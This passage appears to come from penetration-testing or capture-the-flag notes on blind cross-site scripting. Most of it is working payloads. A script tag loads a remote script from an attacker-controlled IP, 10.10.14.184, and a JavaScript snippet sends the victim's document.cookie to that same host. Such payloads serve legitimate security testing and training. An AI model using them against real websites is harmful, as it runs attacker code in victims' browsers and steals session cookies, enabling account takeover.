...
to test if blind XSS is being interpreted, you can load a locally hosted script and test if the website tries to get it

```bash
<script src="http://10.10.14.184/pwn.js"></script>
```


If vulnerable, cookies can be stolen: 

```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.14.184/?cookie=' + document.cookie, true);
request.send();
```
